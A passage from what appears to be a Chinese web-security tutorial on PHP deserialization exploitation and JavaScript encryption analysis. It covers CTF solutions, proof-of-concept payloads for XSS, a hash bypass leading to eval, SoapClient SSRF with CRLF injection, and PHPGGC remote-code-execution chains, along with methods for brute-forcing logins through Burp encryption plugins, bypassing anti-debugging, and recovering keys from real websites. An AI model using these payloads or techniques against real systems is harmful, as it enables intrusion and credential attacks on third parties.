ls&#125;*/\n\n\n原生态利用\n原生类中的魔术方法\n\n\n我们采用下面的脚本遍历一下所有原生类中的魔术方法\n12345678910111213141516171819202122&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;    $methods = get_class_methods($class);    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#x27;__destruct&#x27;,            &#x27;__toString&#x27;,            &#x27;__wakeup&#x27;,            &#x27;__call&#x27;,            &#x27;__callStatic&#x27;,            &#x27;__get&#x27;,            &#x27;__set&#x27;,            &#x27;__isset&#x27;,            &#x27;__unset&#x27;,            &#x27;__invoke&#x27;,            &#x27;__set_state&#x27;        ))) &#123;            print $class . &#x27;::&#x27; . $method . &quot;\\n&quot;;        &#125;    &#125;&#125;\n\n\n一些常见原生类的利用\nEroor/Exception\n\nError 是所有PHP内部错误类的基类。 (PHP 7, 8)\n\nError::__toString：error的字符串表达\n返回 Error 的 string表达形式。\n\n\nException是所有用户级异常的基类。 (PHP 5, 7, 8)\n\nException::__toString：将异常对象转换为字符串\n返回转换为字符串类型的异常\n\n\n\n类属性\n\nmessage：错误消息内容\ncode：错误代码\nfile：抛出错误的文件名\nline：抛出错误的行数\n\nXSS\n\n\n__toString方法会返回错误或异常的字符串形式，其中包含我们输入的参数，如果我们构造一串xss代码，适合echo渲染，将触发反射型xss漏洞\n\n\n示例：\n123&lt;?php$a = unserialize($_GET[&#x27;a&#x27;]);echo $a;\n\n\nPOC：\n1234&lt;?php$a = new Error(&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);\n\n\n\nhash绕过\n\n\n先看一道题，[2020 极客大挑战]Greatphp\n12345678910111213141516171819202122&lt;?phperror_reporting(0);class SYCLOVER &#123;    public $syc;    public $lover;    public function __wakeup()&#123;        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) **= md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)**= sha1($this-&gt;lover)) )&#123;           if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123;               eval($this-&gt;syc);           &#125; else &#123;               die(&quot;Try Hard !!&quot;);           &#125;        &#125;    &#125;&#125;if (isset($_GET[&#x27;great&#x27;]))&#123;    unserialize($_GET[&#x27;great&#x27;]);&#125; else &#123;    highlight_file(__FILE__);&#125;\n\n\n需要绕过两个hash强比较，且最终需要构造eval代码执行\n\n\n显然正常方法是行不通的，但我们通过原生类进行绕过\n\n\n同样，当 md5() 和 sha1() 函数处理对象时，会自动调用 __toString 方法\n\n\n先简单看一下其输出\n1234567&lt;?php$a=new Error(&quot;payload&quot;,1);$b=new Error(&quot;payload&quot;,2);$c=new Exception(&quot;payload&quot;,3);$d=new Exception(&quot;payload&quot;,4);echo $a.&quot;&lt;br&gt;&quot;;echo $b.&quot;&lt;br&gt;&quot;;echo $c.&quot;&lt;br&gt;&quot;;echo $d;\n\n\n\n可以发现，这两个原生类返回的信息除了行号一模一样，利用这点，我们可以尝试进行hash函数的绕过，需要注意的是，必须将两个传入的对象放到同一行\n\n\n因此我们可以进行简单的测试,发现使用此方法可以绕过hash强(弱)函数比较\n1234567891011&lt;?php$a = new Error(&quot;payload&quot;,1);$b = new Error(&quot;payload&quot;,2);if ($a!=$b)&#123;    echo &#x27;$a不等于$b&#x27;.&quot;\\n&quot;;&#125;if (md5($a)**=md5($b))&#123;    echo &quot;md5值相等\\n&quot;;&#125;if (sha1($a)**=sha1($b))&#123;    echo &quot;sha1值相等&quot;;&#125;\n\n\n\n根据这些知识点，我们可以轻松构造payload\n12345678910111213141516171819202122  &lt;?phpclass SYCLOVER &#123;\tpublic $syc;\tpublic $lover;\tpublic function __wakeup()&#123;\t\tif( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) **= md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)**= sha1($this-&gt;lover)) )&#123;\t\t   if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123;\t\t\t   eval($this-&gt;syc);\t\t   &#125; else &#123;\t\t\t   die(&quot;Try Hard !!&quot;);\t\t   &#125;\t\t   \t\t&#125;\t&#125;&#125;$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;//两次取反绕过正则$a=new Error($str,1);$b=new Error($str,2);$c = new SYCLOVER();$c-&gt;syc = $a;$c-&gt;lover = $b;echo(urlencode(serialize($c)));?&gt;\n\n\nSSRF\nSoapClient\n\nSoapClient是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端，可以创建soap数据报文，与wsdl接口进行交互\nsoap扩展模块默认关闭，使用时需手动开启\nSoapClient::__call —调用 SOAP 函数 (PHP 5, 7, 8)\n通常，SOAP 函数可以作为SoapClient对象的方法调用\n\nSSRF\n\n\n构造函数：\n12345public SoapClient :: SoapClient(mixed $wsdl [，array $options ])    第一个参数是用来指明是否是wsdl模式，如果为`null`，那就是非wsdl模式。    第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。\n\n\n什么是soap\n1234SOAP 是基于 XML 的简易协议，是用在分散或分布的环境中交换信息的简单的协议，可使应用程序在 HTTP 之上进行信息交换    SOAP是webService三要素（SOAP、WSDL、UDDI）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。\n\n\n我们构造一个利用payload，第一个参数为NULL，第二个参数的location设置vps地址\n123456789&lt;?php$a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &#x27;http://47.102.146.95:2333&#x27;, &#x27;uri&#x27; =&gt;&#x27;uri&#x27;,&#x27;user_agent&#x27;=&gt;&#x27;111111&#x27;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a();\n\n\n监听vps的2333端口，如下图所示成功触发SSRF，vps收到了请求信息\n\n\n且可以看到 SOAPAction 和 user_agent 都可控\n\n\n\n本地测试时发现，当使用此内置类(即soap协议)请求存在服务的端口时，会立即报错，而去访问不存在服务(未占用)的端口时，会等待一段时间报错，可以以此进行内网资产的探测。\n\n\nr如果配合 CRLF 漏洞，还可以通过 SoapClient 来控制其他参数或者 post 发送数据。例如：HTTP协议去攻击Redis\n\n\nCRLF 知识扩展\n123HTTP报文的结构：状态行和首部中的每行以CRLF结束，首部与主体之间由一空行分隔。CRLF注入漏洞，是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF(\\r\\n)，就能注入一些首部字段或报文主体，并在响应中输出。\n\n\n通过结合 CRLF，我们利用 SoapClient + CRLF 便可以干更多的事情，例如插入自定义Cookie\n123456789&lt;?php$a = new SoapClient(null, array(    &#x27;location&#x27; =&gt; &#x27;http://47.102.146.95:2333&#x27;,    &#x27;uri&#x27; =&gt;&#x27;uri&#x27;,    &#x27;user_agent&#x27;=&gt;&quot;111111\\r\\nCookie: PHPSESSION=dasdasd564d6as4d6a&quot;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a();\n\n\n\n发送POST的数据包，这里需要将Content-Type设置为application/x-www-form-urlencoded，我们可以通过添加两个\\r\\n来将原来的Content-Type挤下去，自定义一个新的Content-Type\n123456789&lt;?php$a = new SoapClient(null, array(    &#x27;location&#x27; =&gt; &#x27;http://47.102.146.95:2333&#x27;,    &#x27;uri&#x27; =&gt;&#x27;uri&#x27;,    &#x27;user_agent&#x27;=&gt;&quot;111111\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nX-Forwarded-For: 127.0.0.1\\r\\nCookie: PHPSESSID=3stu05dr969ogmprk28drnju93\\r\\nContent-Length: 10\\r\\n\\r\\npostdata&quot;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a();\n\n\n\n看一道ctfshow的题，完美利用上述知识点\n1234567891011121314$xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);array_pop($xff);$ip = array_pop($xff); //获取xff头if($ip!**&#x27;127.0.0.1&#x27;)&#123;    die(&#x27;error&#x27;);&#125;else&#123;    $token = $_POST[&#x27;token&#x27;];    if($token**&#x27;ctfshow&#x27;)&#123;        file_put_contents(&#x27;flag.txt&#x27;,$flag);    &#125;&#125;\n\n\nPOC：\n12345678910111213&lt;?php$target = &#x27;http://127.0.0.1/flag.php&#x27;;$post_string = &#x27;token=ctfshow&#x27;;$b = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&#x27;wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded&#x27;.&#x27;^^Content-Length: &#x27;.(string)strlen($post_string).&#x27;^^^^&#x27;.$post_string,&#x27;uri&#x27;=&gt; &quot;ssrf&quot;));$a = serialize($b);$a = str_replace(&#x27;^^&#x27;,&quot;\\r\\n&quot;,$a);echo urlencode($a);?&gt;\n\n\n目录遍历\nDirectoryIterator/FilesystemIterator\n\n\nDirectoryIterator类提供了一个简单的接口来查看文件系统目录的内容。\n\n\nDirectoryIterator::__toString： 获取字符串形式的文件名 （PHP 5,7,8）\n\n\n使用此内置类的__toString方法结合glob或file协议，即可实现目录遍历\n\n\n例如：\n12345&lt;?php$a = new DirectoryIterator(&quot;glob:///*&quot;);foreach ($a as $b)&#123;    echo $b.&#x27;&lt;br&gt;&#x27;;&#125;\n\n\nFilesystemIterator继承于DirectoryIterator，两者作用和用法基本相同，区别为FilesystemIterator会显示文件的完整路径，而DirectoryIterator只显示文件名\n\n\n\n因为可以配合使用glob伪协议(查找匹配的文件路径模式)，所以可以绕过open_basedir的限制\n\n\n在php4.3以后使用了zend_class_unserialize_deny来禁止一些类的反序列化，很不幸的是这两个原生类都在禁止名单当中\n\n\n文件读取\nSplFileObject\n\nSplFileObject 类为单个文件的信息提供了一个面向对象的高级接口   (PHP 5 &gt;= 5.1.2, PHP 7, PHP 8)\n\n文件读取\n\n\nSplFileObject::__toString — 以字符串形式返回文件的路径\n1234567&lt;?phphighlight_file(__file__);$a = new SplFileObject(&quot;./flag.txt&quot;);echo $a;/*foreach($context as $f)&#123;    echo($a);&#125;*/\n\n\n如果没有遍历的话只能读取第一行，且受到open_basedir影响\n\n\nXXE\nSimpleXMLElement\n\n解析XML 文档中的元素。 （PHP 5、PHP 7、PHP 8）\nSimpleXMLElement::__construct — 创建一个新的 SimpleXMLElement 对象\n\nXXE\n\n\n我们查看一下其参数：\n\n\n\n根据官方文档，发现当第三个参数为True时，即可实现远程xml文件载入，第二个参数的常量值设置为2即可。\n\n\n利用可参考赛题：[SUCTF 2018]Homework\n\n\n四、框架利用\n工具介绍\nSerializedPayloadGenerator\n\n下载地址：https://github.com/NotSoSecure/SerializedPayloadGenerator\n介绍：一个国外的项目，集成了不同编程语言的反序列化利用工具，就不用一个一个下了，并且是Web端的网页，直接使用即可；但仅支持将其部署到Windows服务器（IIS）上使用\n\nJava – YSoSerial\nNET – YSoSerial.NET\nPHP – PHPGGC（这个工具生成不出来payload，应该是PHPGGC不支持windows的原因）\nPython - 原生\n\n\n这个搭建算是比较麻烦吧，可以自己使用不同的工具\n\nPHPGGC\n\n\n下载地址：https://github.com/ambionics/phpggc\n\n\n介绍：\n\nPHPGGC 是一个包含 unserialize()有效载荷的库以及一个从命令行或以编程方式生成它们的工具。当在您没有代码的网站上遇到反序列化时，或者只是在尝试构建漏洞时，此工具允许您生成有效负载，而无需执行查找小工具并将它们组合的繁琐步骤。 它可以看作是 frohoff 的 ysoserial 的等价物，但是对于 PHP。 目前该工具支持的小工具链包括：CodeIgniter4、Doctrine、Drupal7、Guzzle、Laravel、Magento、Monolog、Phalcon、Podio、ThinkPHP、Slim、SwiftMailer、Symfony、Wordpress、Yii 和 ZendFramework 等。\n\n\n\n其实就是一个针对各种PHP框架的反序列化payload的生成工具，配合unserialize()使用\n\n\n通常在linux上使用，但是好像也可以在windows正常运行，但需要满足两点：\n\nPHP CLI ≥ 5.6（Windows/Mac 下装个 XAMPP/WAMP/PHPStudy 都可以）。\n手动克隆源码（git clone https://github.com/ambionics/phpggc.git），然后在命令行里用\n\n\n\n\n常用命令：\n12345678&gt; php phpggc -l Laravel : 按照框架筛选利用链 &gt; php phpggc -i Laravel/RCE16 : 查看链详细内容&gt; php phpggc Laravel/RCE4 &lt;function&gt; &lt;parameter&gt;&gt; php phpggc ... --url : url编码(可叠加)&gt; php phpggc ... --soft-url : “软” URL 编码（只编码必要字符）&gt; php phpggc ... --base64 : base64编码&gt; php phpggc ... --plus-numbers : 加号绕过&gt; php phpggc ... --fast-destruct : unserialize() 后立即触发 __destruct，提高稳定性\n\n\n反序列化框架利用 - ThinkPHP&amp;Yii&amp;Laravel\n\n反序列化通常只能白盒审计出来，而像这种框架 0day 只会更难，所以这里先只介绍用工具怎么来进行框架利用，但前提是得用相对应的版本，而且不能保证一定会成功\n这里用几道 ctf 题来进行演示\n\n[安洵杯 2019]iamthinking-Thinkphp V6.0.X 反序列化（BUUCTF）\n\n\n打开题目提示我们访问/public目录\n\n\n\n访问之后，发现什么都没有，那么这个时候就应该拿出我们的目录扫描工具了\n\n\n\n访问www.zip，下载源码，并拖到ide里\n\n\n\n通过观察发现是ThinkPHP框架，因为有他的明显特征，而核心代码就在app文件夹里，我们打开它\n\n\n\nindex.php的源码如下：\n123456789101112131415161718192021222324252627&lt;?phpnamespace app\\controller;use app\\BaseController;class Index extends BaseController&#123;    public function index()    &#123;                echo &quot;&lt;img src=&#x27;../test.jpg&#x27;&quot;.&quot;/&gt;&quot;;        $paylaod = @$_GET[&#x27;payload&#x27;];        if(isset($paylaod))        &#123;            $url = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]);            parse_str($url[&#x27;query&#x27;],$query);            foreach($query as $value)            &#123;                if(preg_match(&quot;/^O/i&quot;,$value))                &#123;                    die(&#x27;STOP HACKING&#x27;);                    exit();                &#125;            &#125;            unserialize($paylaod);        &#125;    &#125;&#125;\n\n\n可以看到unserialize，我们需要传入参数payload，并且这里面设置了一个过滤，只不过过滤的是url，跟我们传入的值没有什么关系\n\n\n可以看到这里并没有什么魔术方法写在上面，那我们就考虑下原生态的应用，比如一定会触发的__destruct()和__wakeup()，但当我们搜索发现，这样的方法太多了，不知道从何下手，这也是寻找 0day 的难点，既要有强大的开发经验还要有一直尝试的耐心，显然以我们现在的技术，想要直接找到框架的漏洞不太现实\n\n\n那么我们就可以找到以前别人发现的这个框架版本的漏洞，然后进行利用，也就是 Nday ，我们先来看一下，这个框架和php的版本\n\n\n\n然后我们上网搜下关于ThinkPHP 6.0的漏洞，但网上的大多数都不给poc，所以这里就可以用我们上面说的工具了\n1phpggc -l #查看所有版本的漏洞\n\n\n\n看到了我们的版本，我们选择一个\n\n\n\n使用方法就是先写调用的方法，然后再写传入的参数\n1phpggc ThinkPHP/RCE3 system ls --url #最后再编码一下\n\n\n这里有个地方要说，不要生成完之后自己进行编码，一定要在他这个工具里进行编码，不然会失效\n\n\n\n我们去尝试一下，上面说过因为它设置了url的过滤，所以我们要进行下绕过，很简单，在前面加两个斜杠就行\n\n\n\nJS 应用\n一、基础知识\n作用域\n\n作用域其实就是一个变量的生命周期\n作用域分为局部作用域和全局作用域，在 JS 中同样如此，简单来说就是运行后相关的数据值\n\n全局作用域的变量我们可以在任意地方调用\n局部作用域的变量我们只能在他的作用域内调用\n\n\n\n调用堆栈\n\n数据在内存中存储的位置\n简单来说就是代码函数的一个执行逻辑顺序，是从下到上的顺序调用\n\nJS 加密数据流程\n\n常见分析调试\n\n代码全局搜索\n文件流程断点\n代码标签断点\nXHR提交缎带那\n\n二、断点调试\n1.流程断点（全局搜索）\n原理\n\n通过审查元素抓网络请求包发起程序，然后自己去审计代码，判断哪个地方时加密函数\n全局搜索：通过抓包参数名或者检查登录框查传递的值\n\n案例演示\n\n\n还是用到申通快递会员的登录，之前在js开发那也说过，但我不知道为啥进不去，用的别人的图\n\n\n\nf12打开开发者调试，先刷新，然后随便输入手机号与密码，看看网络包：\n\n\n\n这里可以很清楚的看到，我们的密码还有手机号啥的都被进行了加密，而且不能一眼看出来这是什么加密\n\n\n但如果我们想要进行测试不过是注入还是爆破，都需要知道他的加密方式，然后将我们的payload进行同样的加密，这样请求包发送到后端进行解密的时候才不会进行报错，从而导致攻击失败，因为在请求包就进行了加密，说明是前端加密\n\n\n我们首先要找到他的这个加密流程，全局搜索一下login，或者搜索password这些\n\n\n\n这样我们就找到了这个加密的函数\n\n\n在源代码中找到这个文件，简单看一下，他用的是ajax传输的数据，我们在这里下一个断点\n\n\n\n这个时候我们再点击登录，他就会停在这里，此时我们观察右边的框框，着重看一下作用域和调用堆栈\n\n\n\n可以看到这时密码已经完成了加密，如果我们想看具体是在哪两步之间调用的，就可以通过下面的调用堆栈去查看\n\n\n因为调用堆栈是从下往上运行的，我们也要从下往上看，看一下他的前一步数据是否被加密\n\n\n\n可以看到连数据都没有加载，说明加密处理就是在login函数当中\n\n\n然后我们往前翻一下就能找到\n\n\n\n通过观察可以发现，他是先利用自己的encrypt函数加密后在进行url编码，传入后端\n\n\n我们将鼠标放到encrypt函数，就可以看到他来自哪个文件了\n\n\n\n点进去一看\n\n\n\n可以看到这就是加密函数的原型，它的实例是JSEncrypt\n\n\n这里有两个用处，因为这个加密他是局部，我们如果一开始就用控制台调用这个加密函数，会显示这个东西未定义\n\n\n\n但是当我们先声明一个实例，然后再去调用的时候，就会发现成功加密出来了\n\n\n\n或者在他断点的时候，直接去调用也是可以的\n\n\n\n但观察发现，这两个加密出来的结果是不一样的，这是因为他是RSA加密\n\n\n上面是他的第一个作用，第二个作用之后再说，先把其他的断点方式简单介绍一下\n\n\n2.标签断点&amp;XHR 断点\n原理\n\n\n首先是标签断点，这个就是对浏览器中的标签元素进行判断，一般有子树修改和属性修改，当你设置的这个标签元素发生更改时，程序就会暂停\n\n\n它的断点条件是加密动作需要伴随前端DOM更新（按钮变灰、插入隐藏域、显示loading），否则是无法断点成功的\n\n\n\n然后是XHR断点，它一般是在XMLHttpRequest.send / fetch 等函数前将程序暂停，其实就是在数据发出的前一刻暂停掉程序\n\n\n\n案例演示\n标签断点\n\n\n由于申通不满足条件，我们换个平台：edu登录站点\n\n\n\n打开网络抓下包，随便输入账号密码，看看加密\n\n\n\n被加密了，那我们进行断点调试，我们先找到登录按钮的标签元素\n\n\n\n为了保险起见，我们将子树和属性都开了，然后随便输入账号密码点击登录\n\n\n然后就会跳转到触发的js代码中，这时我们可以看一看右边的作用域和堆栈信息\n\n\n\n并没有我们想要的，我们需要自己一步一步跳\n\n\n\n但这里并没有跳到，不是很好用，直到怎么操作就行，有些情况应该会好用些\n\n\nXHR断点\n\n\n我们同样用这个网站来做演示，来解释下什么是XHR断点\n\n\n我们首先抓下登录的数据包：\n\n\n\n可以看到他的路径是user/login，我们可以在XHR进行提取\n\n\n\n然后再进行登录，这时就会跳转到fetch或者send函数\n\n\n\n因为已经fetch，所以下一步就是提交数据，那么加密的逻辑肯定是在前面的函数中完成的\n\n\n这里就感觉哪个函数像就行\n\n\n\n\n这里我们点开value函数，可以看到作用域出现了我们填的账号和密码，下面的s好像是加密后的密码，我们可以看到加密的流程\n\n1234a = n.pwdInput.value;var r = new JSEncrypt, o = C.RSACODE;r.setPublicKey(o);var s = r.encrypt(a), l = this.props.actions;\n\n\n首先声明了一个实体，然后定义了一个o，通过setPublicKey生成了RSA的公钥，利用a进行加密\n\n\n这就是加密的流程，RSA加密，然后o在作用域我们也知道是什么，可以在控制台使用\n\n\n3.结合Bp&amp;插件引用\n\n就算我们知道了这个加密流程，想要爆破或者注入的时候，也不能每一次都要在控制台进行加密，效率太低了，所以我们要使用bp插件进行批量加密爆破，通过前端代码，我们先在本地搭建一个一模一样的加密环境\n\n本地搭建\n\n\n我们需要一个东西，就是他加密使用的JS源代码，找到之后直接复制粘贴到本地就行了，这里算法调用的是这个文件\n\n\n\n再将他的加密逻辑复制到下面，改动一点地方，，这里o的值就是作用域中o的值\n\n\n最后代码执行即可\n\n\n\n\n最后写个脚本，对字典中的密码批量加密就行，然后保存为一个新的字典\n\n\nBP插件\n\n\n当然，如果不想自己写脚本生成字典，可以利用bp插件来帮我们边运行边加密\n\n\n首先下载phantomjs，设置环境变量，然后在安装JsEncrypter，然后安装到bp插件中\n\n\n然后在JsEncrypter同级目录里将之前复制的源码粘贴过去，打开phantomjs_server.js文件，在这个地方改成我们刚刚的文件：\n\n\n\n然后下面编写调用加密函数这里，最好是先写一个函数，然后在这里进行调用，这里的代码就是将网站的加密逻辑拿过来改一下即可：\n123456789101112131415function new_encrypt(payload) &#123;      var r = new JSEncrypt, o = &quot;305c300d06092a864886f70d0101010500034b003048024100959684a0076fd2a8fc1589469cf8c95f16ef67490c519f4d274373f29cee64cf6a0db8ad8953122c5b3664e4a48acd34d9b95c0ae62a31be612632e1c49154db0203010001&quot;;      r.setPublicKey(o);      var newpayload = r.encrypt(payload);      return newpayload;  &#125;    // 处理函数  function js_encrypt(payload)&#123;      var newpayload;      /**********在这里编写调用加密函数进行加密的代码************/      newpayload = new_encrypt(payload);      /**********************************************************/      return newpayload;  &#125;\n\n\n然后将这两个文件放到phantomjs的bin目录下，然后执行下面的命令\n\n\n\n\n接着回到bp，找到刚刚装的插件（2025版的好像不好使），点击connect，这里返回true说明连接成功了，点击test就可以看到加密结果了\n\n\n\n然后实战中，先进行抓包\n\n\n\n在这里添加标记，然后导入字典之后，在下面的Payload processing添加处理过程，选中invoke Burp extension：\n\n\n\n之后就可以开始攻击了（实战中最好开个代理）\n\n\n三、反调试绕过\n\n什么是反调试？\n\n我们可以通过开发者模式调试当前网站的js代码进行分析，但是有些网站会限制或禁止别人进行调试\n一般采取的反调试方法有两种：\n\n死循环\n前端禁止调试开发者工具\n\n\n\n如何检测反调试？\n\n检测的方式很简单，可以之间 f12 看能不能正常调试就行\n如果不能正常调试，比如直接不让用f12，或者点开网站就直接崩了，又或者没有数据包，那就说明可能存在反调试\n总的检测方式如下：\n\n键盘监听（F12）\n检测浏览器的高度插值\n检测开发者人员工具变量是否为ture\n利用console.log 调用次数\n利用代码运行的时间差\n利用 toString\n\n\n\n反调试的绕过\n\n\n如果遇到类似死循环的反调试，我们可以通过以下几种方式进行绕过：\n\n禁用断点法\n条件断点法\n永不暂停法\n置空函数法\n本地覆盖法\n\n\n\n而如果只是遇到不让打开开发者模式的网站，我们可以现在一个新的网站打开f12，然后再次访问那个网站即可\n\n\n禁用断点法\n\n\n演示的网站：https://yingshi.axianyu.top/\n\n\n\n我们随便在网上找个视频的网址，让他解析，然后f12尝试调试，会发现他会自己暂停\n\n\n\n这时无论我们怎么点击下一步都不会起作用，他会一直卡在那里，并且网络包也是没有\n\n\n接下来我们使用禁用断点法，点击这个位置\n\n\n\n这个时候我们在点击启动脚本执行，页面就不会卡住了，而且也能正常的抓到网络包\n\n\n\n但是这个方法的弊端也很明显，就是我们也不能进行断点调试了\n\n\n条件断点法\n\n\n简单来说就是我们可以把他发生暂停的debugger这个函数的执行条件设为flase这样他就不能执行了\n\n\n注意，这里只是可能不执行了，因为他有利用的条件：\n\n必须能明确知道是哪一行代码触发的 debugger\n调试器必须支持条件断点（Chrome、vs code、gdb、lldb均支持）\n\n\n\n接下来还是那个站来演示一下\n\n\n\n\n然后再次加载这个网站就能设置断点，其他的也正常了\n\n\n但有时候稳定性不是很好\n\n\n永不暂停法\n\n\n这个方法简单来说就是DevTools 提供的局部指令，告诉调试器“即使这一行出现 debugger 也直接跳过”\n\n\n所以它的缺点我们可以很明显地看出来\n\n我们需要知道哪里调用了debugger，并且只能在 DevTools 里手动设置哪一行不暂停\n对**动态注入的debugger（例如eval(“debugger”）**可能失效，因为行号会变化\n\n\n\n接下来还是拿那个站演示一下\n\n\n\n点击之后就可以了\n\n\n但是有时候只暂停一个地方是不行的，因为可能其他地方也调用了debugger\n\n\n函数置空法\n\n\n就是将debugger函数里的内容置空，这样在调用的时候，就不会执行任何操作了\n\n\n它是一种比较高端的用法，但是有许多限制\n\n目标站点的debugger是由可 hook 的全局函数触发（如setInterval、eval、Function）\n业务逻辑没有严格校验这些原生函数是否改写（有些站会检测 Function.toString长度）。\n\n\n\n我们可以通过控制台来找打他的位置，但是这个网站一直在清空控制台的输出数据，我们就没办法去输入东西\n\n\n但由于他的这个举动，我们就可以定位到他的反调试代码\n\n\n\n\n然后复制下来问ai就行，也可以自己看\n\n\n当然弊端就是如果遇到这种不让用控制台的，或者找着太费劲的，这个方法就不好用了\n\n\n本地覆盖法\n\n\n原理就是把远程 js 文件下载到本地，删掉/注释其中的 debugger 语句，然后让浏览器在加载时直接用本地版本覆盖网络版本\n\n\n这个是最好用，也是很高端的方法，但是缺点就是比较难配置\n\n\n演示的站控制台输出不了，我们就可以尝试让他加载本地的 js 代码来绕过\n\n\n我们首先来到源代码这里，点击替换/覆盖，然后添加文件夹进去\n\n\n\n然后我们找到调用debugger的代码，可以全局搜索一下，然后选择替换内容，并将那个地方注释掉，再ctrl + s\n\n\n\n然后就将调用debugger的地方重复上面的操作即可\n\n\n四、混淆加密\n什么是混淆加密\n\n混淆加密简而言之就是加密代码，这也是反调试的一种手段，不过更多的是防止敏感的前端js代码泄露\n根据业务和公司的情况不同，代码混淆加密的方式也有所不同\n一些小公司可能采用开源的混淆加密方式，比如JJEncode、AAEncode、JSFuck等\n一些中型公司可能就会采用网上收费的混淆加密方式，比如jsjjami、sojson等\n而大公司则会选择自己自研的一种加密方式\n针对不同的加密方式，我们就要用不同的策略去尝试加密，比如开源的加密，我们会选择在网上找相对应的解密网站；部分收费的或许也有；但如果是自研的话，没那个能力只能抓紧跑路了\n\n开源加密方式\n\n\n比如这里有一个代码\n123456function printLing() &#123;  console.log(&#x27;gcaliez&#x27;);&#125;printLing();// 输出：gcaliez\n\n\n然后我们使用JJEncoding加密一下。网址：JJencode js加密，JS 不可逆加密，JS 安全加密—在线加密\n\n\n\n放到控制台上运行看看是否能正常运行。（尽量打开一个网站然后在其控制台上运行）\n\n\n\n可以看到输出是正常的，说明这个东西是能够识别的\n\n\n我们在试下AAEncoding加密\n\n\n\n\n也是成功执行了\n\n\n接下来的JSFuck也是一样可以执行的\n\n\n而当我们遇到这个加密的时候，就可以放到对应的网站进行解密，但如果遇到不能接出来的网站，我们可以使用下面的办法\n\n\n我们可以直接尝试删除混淆代码的一部分内容，一般是删掉最后的括号的内容\n\n\n\n\n成功拿到原先的源码，这种方法对于上面提到的解密都适用\n\n\n商业加密方式\n\n\n这里用一个站点做演示：https://www.eisk.cn/Tides，先f12翻一翻数据包，可以发现这个东西\n\n\n\n通过观察发现，他虽然保留了js代码的基本格式，但是变量、参数什么的都进行了加密，根本看不懂\n\n\n不过我们可以看到他用的加密方式是jsjiami，这是一个商业的加密方式\n\n\n这里我们可以使用一个免费的解密网站：JSDec - Liulihaocai\n\n\n\n这里成功破解，可以看到他泄露了自己数据的加密方式、密钥、IV向量\n\n\n于是我们就可以找到它的加密数据，然后尝试解密，这里我们找到了它加密的数据\n\n\n\n然后我们把数据拿出来放到解密网站上，填入我们得到的密钥、IV这些尝试解密，在线AES加密解密、AES在线加密解密、AES encryption and decryption–查错网\n\n\n\n五、JS 安全案例\n为什么要找 JS 代码文件\n\n在 Javascript 中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞。\nJS 开发应用和 PHP，JAVA 等区别在于即使没源代码，也可通过浏览器查看源代码。\n获取 URL，获取 JS 敏感信息，获取代码传参等，所以相当于 JS 开发的 WEB 应用属于白盒测试，一般会在 JS 中寻找更多 URL 地址，（加密算法，APIkey 配置，验证逻辑，框架漏洞等）进行后期安全测试。\n\n利用方式\n\n会增加攻击面（URL、接口、分析调试代码逻辑）\n敏感信息（用户密码、ak/sk、token/session）\n潜在危险函数（eval/dangerallySetInnerHTML）\n开发框架类（寻找历史漏洞vue、NodeJS、Angular）\n\n泄露云配置\n案例演示\n\n\n这种不太好在网上找案例，这里直接用别人本地搭建的来演示\n1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;/&gt;  &lt;title&gt;OSS 直传 Demo&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;h2&gt;选择文件直传到 OSS&lt;/h2&gt;  &lt;input type=&quot;file&quot; id=&quot;fileInput&quot; /&gt;  &lt;button onclick=&quot;upload()&quot;&gt;上传&lt;/button&gt;  &lt;script src=&quot;https://gosspublic.alicdn.com/aliyun-oss-sdk.min.js&quot;&gt;&lt;/script&gt;  &lt;script&gt;    // ⚠️ 把以下 4 个值换成你自己的    const accessKeyId     = &#x27;你的AccessKeyId&#x27;;    const accessKeySecret = &#x27;你的AccessKeySecret&#x27;;    const bucket          = &#x27;你的bucket名字&#x27;;    const region          = &#x27;oss-cn-hangzhou&#x27;;   // 根据实际区域填写    // 初始化客户端    const client = new OSS(&#123;      accessKeyId,      accessKeySecret,      bucket,      region    &#125;);    async function upload() &#123;      const file = document.getElementById(&#x27;fileInput&#x27;).files[0];      if (!file) return alert(&#x27;请先选择文件&#x27;);      try &#123;        const result = await client.put(file.name, file);        alert(&#x27;上传成功！地址：&#x27; + result.url);      &#125; catch (e) &#123;        alert(&#x27;上传失败：&#x27; + e.message);      &#125;    